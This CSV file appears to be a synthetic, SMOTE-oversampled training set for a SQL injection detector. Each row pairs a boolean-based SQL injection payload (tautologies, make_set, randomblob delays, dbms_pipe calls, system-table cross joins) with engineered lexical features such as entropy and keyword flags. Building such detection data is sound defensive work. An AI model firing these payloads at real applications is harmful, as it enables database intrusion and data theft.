id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000090,attack,boolean,"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000112,0.2897932951614203,68.83575006127049,25.367150012254097,3.8472405264664244,13.999999999999996,24.0,21.468600049016384,9.367150012254097,0.20362759103279712,0.3490758703419379,0.3112937815212869,0.13600275710397805,0.0,1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,2.367150012254097,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000091,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000184,1.0163394440419364,76.79810364070241,22.800474089824398,3.5366795486276,13.0,24.0,29.598577730526802,10.199525910175602,0.16972650219980362,0.31334123483040666,0.38443522603119223,0.13249703693859752,0.0,0.5997629550878004,3.0,0.0,1.0,2.0,0.0,3.5997629550878005,0.0,0.0,0.0,6.0,0.0,0.5997629550878004,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000092,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000238,0.81333327569752,64.6338068123635,22.450710218545247,3.5935516253901967,13.0,20.0,24.0,7.633806812363497,0.20116251805598892,0.3094807970092137,0.37137695641105645,0.117979728523741,0.18309659381825116,0.816903406181749,2.6338068123634977,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,4.633806812363498,0.18309659381825105,0.8169034061817491,0.816903406181749,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000093,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,nearest_attack_euclidean,R000139,0.0984080531334805,137.0,28.473790944547336,3.3283570668211584,42.0,13.0,66.0,16.0,0.30656934306569344,0.0948905109489051,0.48175182481751827,0.11678832116788321,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000094,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000238,0.5213376423750099,69.43298243889551,24.47766081296517,3.6613301809510745,13.738830406482588,20.98510720864345,25.97021441728689,8.738830406482585,0.19821968576751187,0.30312739940387656,0.3732478885245887,0.12540502630402298,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.4925536043217233,0.0,0.0,0.24627680216086167,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000095,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000018,0.30795429270499464,145.8761719858732,30.0,4.038113525045474,84.87617198587321,8.0,38.0,15.0,0.5818349783249063,0.05484131431804508,0.26049624301071406,0.10282746434633451,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8761719858732231,0.12382801412677696,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000096,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000123,0.19172447418731378,127.9240073302472,31.151985339505586,3.5447976307008653,34.92400733024721,15.0,56.0,22.0,0.2730027486289979,0.1172576211888713,0.4377617857717862,0.17197784441034458,6.0,1.1102230246251565e-16,0.0,1.0,0.0,2.0,0.0,10.0,1.9999999999999998,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9240073302472078,0.07599266975279256,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000097,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,0.8100302208922762,85.92942738221228,26.229416319811918,3.541355095685027,21.217654216847297,14.988237897035381,36.48235684555307,13.241178422776535,0.24324135722136453,0.1745599501937114,0.4275988793585064,0.15459981322641775,4.0,1.1102230246251565e-16,1.0,0.0,0.0,1.2529405257411548,0.0,5.4941189485176904,0.0,0.7470594742588451,0.747059474258845,2.252940525741155,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,1.462981633810955,66.97324416801668,22.441471574224074,3.417527605232884,26.0,4.4414715742240745,27.09030101956853,9.441471574224074,0.38992408545669455,0.06611987048149251,0.40285077253095614,0.14110527153085684,0.0,1.11705685155185,2.0,0.0,1.0,2.4414715742240753,0.0,1.4414715742240753,0.0,0.0,0.0,5.88294314844815,0.0,0.5585284257759249,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000099,attack,boolean,"-3649""   )    )    as eydu where 3220  =  3220 or elt  (  8705  =  1510,1510  )  --",nearest_attack_euclidean,R000175,0.7132540723343316,78.56103632935843,27.66831089880753,3.75532780808799,15.112207265871689,24.0,28.44882906348674,11.0,0.1923315104468749,0.30673958212500374,0.36033993228749467,0.1405889751406267,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.556103632935843,0.0,0.4438963670641569,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000068,0.8223002486332669,129.94233448504636,30.380179575772797,3.9918920921216667,72.0,8.0,34.801795757727966,15.14053872731839,0.5553711256276326,0.06170790284751475,0.2666673681553367,0.11625360336951593,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.760359151545592,0.38017957577279626,0.0,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'  =  'nkte",nearest_attack_euclidean,R000105,0.5773101677581428,117.17916130777336,29.029860217962227,4.244319394534868,76.60451076286779,3.5149301089811136,24.029860217962227,13.029860217962225,0.6539238203479726,0.02985569165557632,0.20517056867465172,0.11104991932179936,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,2.5149301089811127,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000168,0.26234753839278563,78.88207158070784,27.47051789517696,3.8916362052191356,18.411553685530883,24.0,25.47051789517696,11.0,0.23231767578451626,0.30489265720666525,0.3230471991224302,0.13974246788638825,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,0.9726441406467896,63.57488589141725,22.574885891417253,3.479738762636407,25.42511410858275,4.0,24.862328837125876,9.287442945708625,0.40020394521706093,0.06293051439177802,0.39084968384491237,0.14601585654624863,0.0,1.4251141085827495,2.0,0.0,1.0,2.0,0.0,1.2874429457086256,0.0,0.0,0.0,5.287442945708626,0.0,0.7125570542913746,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.7125570542913746,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.712557054291374
SMOTE_000104,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",nearest_attack_euclidean,R000197,0.47952800883646757,114.07016308686356,29.0,3.6734540023332545,42.38915021340493,13.0,46.5837253201074,12.097287553351233,0.3716119843324642,0.11405137595423734,0.40827386948161665,0.10606277023168188,0.3891502134049327,3.6108497865950673,0.0,0.0,0.0,1.9027124466487668,0.0,6.194575106702466,0.0,0.0,0.0,1.902712446648767,0.09728755335123318,0.9027124466487668,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000105,attack,boolean,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",nearest_attack_euclidean,R000025,1.0471260879467386,92.8171391128395,25.884155333569023,3.304724839631734,18.884155333569026,14.512207111425363,44.28051777856341,15.140258889281704,0.20440617952546453,0.15599181507062662,0.4773918558990611,0.1622101495048478,0.0,4.0,1.0,0.0,0.0,1.6280517778563406,0.0,7.256103555712681,0.0,0.6280517778563406,0.6280517778563406,2.6280517778563404,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000106,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",nearest_attack_euclidean,R000165,1.4437008338293447,132.38458306808513,29.532048589007097,4.090469235753955,74.0640971780142,7.553414315011827,32.213657260047306,18.553414315011825,0.5669006830678113,0.05550680213865042,0.2374208245700304,0.14017169022350795,3.5106828630023657,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.042731452009461,0.0,5.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.5106828630023652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.510682863002365
SMOTE_000107,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000076,0.6678353284323598,137.6101440973672,28.80046109533487,3.985341812640591,66.60092219066975,14.40368876267898,43.004610953348724,13.600922190669746,0.48576592115912565,0.10349539311869366,0.3118660957156101,0.09887259000657059,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.8004610953348725,0.0,5.800461095334873,0.0,0.0,2.0,2.8004610953348728,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.8004610953348725,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8004610953348728
SMOTE_000108,attack,boolean,"1  )   where 7485  =  7485 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000109,0.5178883171330365,68.11687202264056,25.77921800566014,3.809795796381566,15.0,21.0,23.116872022640568,9.0,0.2203449096232757,0.30848287347258596,0.3389652711301729,0.1322069457739654,0.0,0.22078199433985846,2.0,0.0,0.0,2.0,0.0,2.7792180056601414,0.0,1.0,1.0,4.0,0.0,0.22078199433985835,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000109,attack,boolean,"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",nearest_attack_euclidean,R000059,1.1571105975197187,84.24733368107769,28.123666840538846,3.8643460996648327,20.0,24.0,29.18550026080827,11.061833420269423,0.237933711133302,0.2855204533599624,0.3455126910733866,0.13103314443334899,0.5309167101347114,1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,3.5309167101347114,0.0,1.0,1.0,5.0,0.5309167101347114,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000110,attack,boolean,"1'   )    )    as tfub where 3461  =  3461 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000091,0.5150483806613104,160.98771211944833,37.13232467381287,3.8903953597457885,47.14461255436452,24.0,63.13232467381287,26.710774891270958,0.2929512052645552,0.14911568734102906,0.3920439275791712,0.1658891798152445,0.8553874456354779,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,11.855387445635479,0.0,2.0,1.0,10.0,0.8553874456354779,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.14461255436452214,0.855387445635478,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000285,0.10443241983165436,164.25616577701055,36.952010695291,4.110646602996983,66.71206417174602,18.0,56.56809625761903,22.976005347645504,0.40616587432285783,0.10969647290881093,0.3441490019546603,0.13998865081367096,8.0,1.1102230246251565e-16,1.0,0.0,0.0,1.023994652354498,0.0,7.904021390582008,0.047989304708996094,0.0,0.0,6.023994652354498,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000112,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000168,0.21721363131220137,78.74388739562801,27.82645287658677,3.9311602947609083,18.95871725952062,24.0,24.95871725952062,10.826452876586771,0.2397927287778885,0.3061268523066318,0.31632444185454645,0.13775597706093323,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.8264528765867696,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000113,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,1.7509547875278562,125.16202493567661,30.10801662378441,4.165869738161089,76.21603324756882,5.891983376215592,29.945991688107796,13.108016623784408,0.6085226857604175,0.047485000794882756,0.23958684765261118,0.10440546579208856,0.0,1.5810124678383066,0.0,0.0,1.0,1.0,0.0,3.472995844053898,0.0,0.0,2.527004155946102,2.0,0.0,0.5270041559461022,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000214,0.31381683326662974,69.17916333375925,25.36416733324815,3.655792977897694,12.0,16.0,26.543330667007403,14.63583266675185,0.17405911798542806,0.23207882398057078,0.3822581168349726,0.21160394119902853,0.0,4.0,1.0,0.0,0.0,2.0,0.0,3.635832666751851,1.9999999999999998,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000115,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000256,0.7495071082248619,133.50570320044505,31.539338953914623,4.047545138710882,66.15735581565849,8.269669476957311,41.53933895391462,17.539338953914623,0.4953249731687531,0.06191562164609414,0.311424434254473,0.13133497093067967,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,6.0,1.0,0.0,2.2696694769573114,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.26966947695731125,0.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,1.5353144850157234,105.0,33.41268972193899,3.797786954497709,31.58731027806101,15.0,42.0,16.41268972193899,0.30083152645772393,0.14285714285714285,0.4,0.15631133068513325,2.4126897219389902,0.5873102780610098,2.0,1.0,0.0,1.0,0.0,8.0,0.4126897219389904,0.0,1.0,4.0,1.0,0.5873102780610097,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5873102780610095,0.4126897219389904,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000117,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000064,0.072024955297154,133.3168244506667,29.070405433481486,3.5888661367204735,50.152545105876555,10.0,55.07040543348149,18.09387391130865,0.37614883818365824,0.07503908625438595,0.41315500835838204,0.13565706720357376,4.976531522172838,1.1102230246251565e-16,0.0,0.9882657610864188,0.0,0.0,0.0,11.023468477827162,0.0,0.023468477827162437,1.0,1.0586711945679057,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.011734238913581108,1.0,0.0,0.0,0.011734238913581219,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.011734238913581
SMOTE_000118,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",nearest_attack_euclidean,R000165,1.7675361123545745,136.77765046899066,28.38517669793271,3.9664344240211813,69.07411651033645,10.00729707312523,39.08141358346168,18.61482330206729,0.5073458161432468,0.07095407634813615,0.2850397240693201,0.1366603834392969,1.8444699062018703,1.1102230246251565e-16,0.0,0.0,1.0,1.38517669793271,0.0,5.38517669793271,0.0,5.0,4.0,2.3851766979327103,0.6148233020672902,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.38517669793271,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.38517669793271
SMOTE_000119,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",nearest_attack_euclidean,R000219,1.4243445947613125,125.74203995339164,32.41014571095655,3.744177854662899,44.76956286713036,12.05072855478273,50.69131139860892,18.23043713286964,0.35772473297261365,0.09506635740298577,0.4024304409218695,0.144778468702531,2.0,3.410145710956546,0.0,1.0,0.0,1.410145710956546,0.0,9.410145710956545,0.0,0.0,1.0,2.410145710956546,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5898542890434539,0.0,0.0,0.0,1.410145710956546,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
